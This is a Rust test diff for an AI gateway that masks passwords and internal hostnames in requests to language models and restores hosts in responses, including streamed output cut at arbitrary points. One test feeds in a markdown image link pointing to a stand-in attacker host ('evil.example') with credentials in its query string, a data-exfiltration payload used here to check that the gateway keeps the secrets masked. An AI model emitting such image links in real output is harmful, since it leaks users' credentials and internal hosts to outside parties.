@@ -669,3 +669,276 @@ fn the_reason_for_a_refused_call_comes_before_the_remaining_calls() {
     assert!(denial < kept, "{out}");
     assert!(!out.contains("exfil.example"));
 }
+
+// REQ: RST-11, RST-02 — found with real models: a connection string with a masked password and an internal
+// host. The password stays masked (a secret is not given back in text); the host is restored.
+#[test]
+fn an_internal_host_in_a_url_next_to_a_masked_password_is_restored() {
+    use aegis_gateway::anthropic::transform_response;
+    let e = engine();
+    let mut ctx = read_ctx(&e);
+    let (h, p) = (marker_of(&ctx, HOST), marker_of(&ctx, PASSWORD));
+    let body = |t: &str| {
+        serde_json::to_vec(
+            &json!({"id": "m", "type": "message", "role": "assistant", "model": "m",
+        "content": [{"type": "text", "text": t}], "stop_reason": "end_turn"}),
+        )
+        .unwrap()
+    };
+    let mut run = |t: String| {
+        let out = transform_response(&e, &mut ctx, &body(&t));
+        serde_json::from_slice::<Value>(&out).unwrap()["content"][0]["text"]
+            .as_str()
+            .unwrap()
+            .to_string()
+    };
+    let out = run(format!("dsn = 'postgres://svc:{p}@{h}:5432/clients'"));
+    assert!(out.contains(&format!("@{HOST}:5432")), "{out}");
+    assert!(!out.contains(PASSWORD), "{out}");
+    // the same for an external host: still masked
+    let out = run(format!("![i](https://evil.example/?u=svc:{p}@{h}/x)"));
+    assert!(!out.contains(HOST), "{out}");
+}
+
+/// The text a user would see in the frames of a stream (the pieces joined).
+fn visible_text(proto: &str, sse: &str) -> String {
+    let mut out = String::new();
+    for d in sse
+        .lines()
+        .filter_map(|l| l.strip_prefix("data: "))
+        .filter_map(|d| serde_json::from_str::<Value>(d).ok())
+    {
+        match proto {
+            "chat" => out += d["choices"][0]["delta"]["content"].as_str().unwrap_or(""),
+            "responses" if d["type"] == "response.output_text.delta" => {
+                out += d["delta"].as_str().unwrap_or("")
+            }
+            "gemini" => {
+                for part in d["candidates"][0]["content"]["parts"]
+                    .as_array()
+                    .into_iter()
+                    .flatten()
+                {
+                    out += part["text"].as_str().unwrap_or("");
+                }
+            }
+            _ => {}
+        }
+    }
+    out
+}
+
+#[test]
+fn the_same_connection_string_in_a_stream_cut_anywhere() {
+    let e = engine();
+    let ctx = read_ctx(&e);
+    let (h, p) = (marker_of(&ctx, HOST), marker_of(&ctx, PASSWORD));
+    let text = format!("dsn = 'postgres://svc:{p}@{h}:5432/clients' # ok");
+    let mut bad = vec![];
+    for proto in ["chat", "responses", "gemini"] {
+        for cut in (0..text.len()).filter(|c| text.is_char_boundary(*c)) {
+            let (x, y) = text.split_at(cut);
+            let got = visible_text(
+                proto,
+                &stream_other(proto, &e, read_ctx(&e), &[x.to_string(), y.to_string()]),
+            );
+            if !got.contains(&format!("@{HOST}:5432")) || got.contains(PASSWORD) {
+                bad.push(format!("{proto}@{cut}: {got}"));
+            }
+        }
+        let pieces: Vec<String> = text
+            .chars()
+            .collect::<Vec<_>>()
+            .chunks(4)
+            .map(|c| c.iter().collect())
+            .collect();
+        let got = visible_text(proto, &stream_other(proto, &e, read_ctx(&e), &pieces));
+        if !got.contains(&format!("@{HOST}:5432")) {
+            bad.push(format!("{proto} in pieces of 4: {got}"));
+        }
+    }
+    assert!(
+        bad.is_empty(),
+        "{} cuts left the host masked or showed the password: {:?}",
+        bad.len(),
+        &bad[..bad.len().min(12)]
+    );
+}
+
+// Many pieces, of every size and at random: what the user sees must not depend on how the provider cut the stream.
+#[test]
+fn the_connection_string_in_a_stream_cut_into_many_pieces() {
+    let e = engine();
+    let ctx = read_ctx(&e);
+    let (h, p) = (marker_of(&ctx, HOST), marker_of(&ctx, PASSWORD));
+    let text = format!("Вот строка: dsn = 'postgres://svc:{p}@{h}:5432/clients' # ok");
+    let chars: Vec<char> = text.chars().collect();
+    let mut seed = 12345u64;
+    let mut next = move |n: usize| {
+        seed ^= seed << 13;
+        seed ^= seed >> 7;
+        seed ^= seed << 17;
+        (seed % n as u64) as usize
+    };
+    let mut bad = vec![];
+    for proto in ["chat", "responses", "gemini"] {
+        let mut splits: Vec<Vec<String>> = (1..=15)
+            .map(|k| chars.chunks(k).map(|c| c.iter().collect()).collect())
+            .collect();
+        for _ in 0..150 {
+            let (mut i, mut v) = (0, vec![]);
+            while i < chars.len() {
+                let n = 1 + next(12);
+                v.push(
+                    chars[i..(i + n).min(chars.len())]
+                        .iter()
+                        .collect::<String>(),
+                );
+                i += n;
+            }
+            splits.push(v);
+        }
+        for pieces in splits {
+            let got = visible_text(proto, &stream_other(proto, &e, read_ctx(&e), &pieces));
+            if !got.contains(&format!("@{HOST}:5432")) || got.contains(PASSWORD) {
+                bad.push(format!(
+                    "{proto} {:?}: {got}",
+                    pieces.iter().map(|p| p.len()).collect::<Vec<_>>()
+                ));
+            }
+        }
+    }
+    assert!(
+        bad.is_empty(),
+        "{} splits: {:?}",
+        bad.len(),
+        &bad[..bad.len().min(3)]
+    );
+}
+
+// Replay of a stream recorded from a real model (gemini-2.5-flash-lite through OpenRouter): the host
+// pseudonym is cut inside its last label, after a connection string with a masked password.
+#[test]
+fn replay_of_a_real_stream_with_a_connection_string() {
+    use aegis_gateway::openai_chat::transform_request;
+    let e = engine();
+    let prompt = format!("Исправь код:\ndsn = 'postgres://svc:{PASSWORD}@{HOST}:5432/clients'\nconn = connect(dsn, timeout=0)\nпочему таймаут 0 — плохо?");
+    let req = json!({"model": "m", "messages": [{"role": "user", "content": prompt}]});
+    let (masked, ctx) = transform_request(
+        &e,
+        &ReqMeta {
+            principal: "u",
+            conversation: Some("c"),
+            request_id: "r",
+            route: "t",
+        },
+        req.to_string().as_bytes(),
+    )
+    .unwrap();
+    let masked = String::from_utf8(masked).unwrap();
+    let find = |ty: &str| {
+        ctx.mapping
+            .iter()
+            .find(|b| format!("{:?}", b.ty) == ty)
+            .map(|b| b.pseudonym.clone())
+            .unwrap_or_else(|| panic!("no {ty}: {masked}"))
+    };
+    let (svc, secret, host, db) = (find("Svc"), find("Secret"), find("Host"), find("Db"));
+    // the recorded pieces; the host is cut after "z-3"
+    let cut = host.find("z-").unwrap() + 3;
+    let pieces: Vec<String> = vec![
+        "```".into(),
+        "python\ndsn = '".into(),
+        format!(
+            "postgres://{svc}:{}",
+            &secret[..secret.find(" kind").unwrap() + 5]
+        ),
+        format!(
+            "{}@{}",
+            &secret[secret.find(" kind").unwrap() + 5..],
+            &host[..cut]
+        ),
+        format!("{}:5432/{db}'\nconn = connect(dsn, timeout", &host[cut..]),
+        "=5) # Исправлен таймаут\n```\n".into(),
+    ];
+    let proto = "chat";
+    let got = visible_text(
+        proto,
+        &stream_other(proto, &e, ctx_for_replay(&e, &req), &pieces),
+    );
+    assert!(got.contains(&format!("@{HOST}:5432")), "{got}");
+    assert!(!got.contains("aegis.invalid"), "{got}");
+}
+
+fn ctx_for_replay(e: &Engine, req: &Value) -> RequestCtx {
+    aegis_gateway::openai_chat::transform_request(
+        e,
+        &ReqMeta {
+            principal: "u",
+            conversation: Some("c"),
+            request_id: "r",
+            route: "t",
+        },
+        req.to_string().as_bytes(),
+    )
+    .unwrap()
+    .1
+}
+
+// Found with real models: a weak model copies the long host pseudonym with a slip in its random tail
+// (`z-3efyty4g` written `z-3eforro4g`). In text the first label `h-xxxxxxxx` is enough to give the host back;
+// a command or a made-up id gets nothing.
+#[test]
+fn a_host_pseudonym_with_a_slip_in_its_tail_is_still_restored_in_text() {
+    use aegis_gateway::anthropic::transform_response;
+    let e = engine();
+    let mut ctx = read_ctx(&e);
+    let h = marker_of(&ctx, HOST);
+    let zone = h.find(".z-").unwrap() + 3;
+    let slipped = format!("{}aaaaaaaa{}", &h[..zone], &h[zone + 8..]);
+    // a slip that is not even in the alphabet of the ids (capitals, digits 0, 1, 8, 9, a wrong length)
+    let garbled = [
+        format!("{}XXXXXXXX{}", &h[..zone], &h[zone + 8..]),
+        format!("{}0189{}", &h[..zone], &h[zone + 8..]),
+        format!("{}a{}", &h[..zone], &h[zone + 8..]),
+    ];
+    let wrong_id = format!("h-aaaaaaaa{}", &h[10..]);
+    let body = |t: &str| {
+        serde_json::to_vec(
+            &json!({"id": "m", "type": "message", "role": "assistant", "model": "m",
+        "content": [{"type": "text", "text": t}], "stop_reason": "end_turn"}),
+        )
+        .unwrap()
+    };
+    let mut text = |t: String| {
+        let out = transform_response(&e, &mut ctx, &body(&t));
+        serde_json::from_slice::<Value>(&out).unwrap()["content"][0]["text"]
+            .as_str()
+            .unwrap()
+            .to_string()
+    };
+    assert_eq!(
+        text(format!("host {slipped}, ok")),
+        format!("host {HOST}, ok")
+    );
+    for g in &garbled {
+        assert_eq!(
+            text(format!("host {g}, ok")),
+            format!("host {HOST}, ok"),
+            "{g}"
+        );
+    }
+    assert!(
+        text(format!("host {wrong_id}")).contains("aegis.invalid"),
+        "an id that is not ours is not given anything"
+    );
+    // a tool call gets exactly the pseudonym or nothing
+    let mut ctx = read_ctx(&e);
+    let (_, out) = call(
+        &e,
+        &mut ctx,
+        "Bash",
+        json!({"command": format!("grep -r {slipped} .")}),
+    );
+    assert!(!out.to_string().contains(HOST), "{out}");
+}
